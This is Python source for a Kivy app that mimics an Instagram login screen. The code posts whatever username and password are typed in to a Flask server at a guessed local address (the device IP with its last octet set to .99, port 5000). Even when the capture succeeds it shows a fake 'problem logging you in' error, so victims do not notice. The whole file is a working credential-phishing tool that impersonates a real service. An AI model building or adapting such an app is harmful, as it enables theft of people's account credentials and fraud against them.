from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.dialog import MDDialog
from kivymd.uix.button import MDRaisedButton
from kivy.core.window import Window
from kivy.utils import rgba
import requests, socket
from requests.exceptions import ConnectionError

############################# MESSAGES ##################################

message_login_successful = 'The was a problem logging you into Instagram. Please try again soon.'
message_login_failed = 'Incorrect username or password. Please try again.'
message_server_connection = "We couldn't connect to Instagram. Make sure you're connected to the internet and try again."
message_connection_error = 'Server is down or unreachable. Please try again soon.'
message_empty_login = "Username or password cannot be empty. Please try again."

#########################################################################

Window.size = (400, 680)


class InstagramApp(MDApp):
    def build(self):
        return Builder.load_file('insta-login.kv')

    def on_login(self, username, password):
        if self.is_server_available():  # Check server connection
            url = self.get_server_ip()
            api_url = url + "/user"  # This api is connect to your server (flask,fastapi or something).
            payload = {'username': username, 'password': password}
            try:
                response = requests.post(api_url, json=payload)
                if response.status_code == 200:
                    self.show_error_dialog("Error", message_login_successful)
                elif response.status_code == 401:
                    self.show_error_dialog("Error", message_empty_login)
                else:
                    self.show_error_dialog("Error", message_login_failed)
            except ConnectionError:
                self.show_error_dialog("Connection error", message_connection_error)
        else:
            self.show_error_dialog("Error", message_server_connection)

    def get_public_ip(self):
        try:
            # Create a socket object
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                # Connect to a remote server
                sock.connect(("8.8.8.8", 80))
                # Get the socket's local address, which is your public IP address
                ip_address = sock.getsockname()[0]
                return ip_address
        except socket.error as e:
            pass

    def get_server_ip(self):
        public_ip = self.get_public_ip()
        if public_ip:
            # Change public ip last octet for find server ip
            flask_server_ip_last_octet = '.99'
            ip = public_ip.rsplit('.', 1)[0] + flask_server_ip_last_octet
            url = "http://" + ip + ":5000/"  # This is flask server ip, for example: http://192.168.100.99:5000
        else:
            url = False

        return url

    # Check server connection
    def is_server_available(self):
        url = self.get_server_ip()
        try:
            if url is False:
                return False
            else:
                requests.get(url)
                return True
        except ConnectionError:
            return False

    # Show error dialog
    def show_error_dialog(self, title, message):
        dialog = MDDialog(
            title=title,
            text=message,
            buttons=[MDRaisedButton(text="OK", on_release=self.dismiss_dialog)])

        dialog.ids.text.text_color = rgba("#FF2B2B")
        dialog.open()

    def dismiss_dialog(self, *args):
        for dialog in MDApp.get_running_app().root_window.children:
            if isinstance(dialog, MDDialog):
                dialog.dismiss()


if __name__ == '__main__':
    InstagramApp().run()
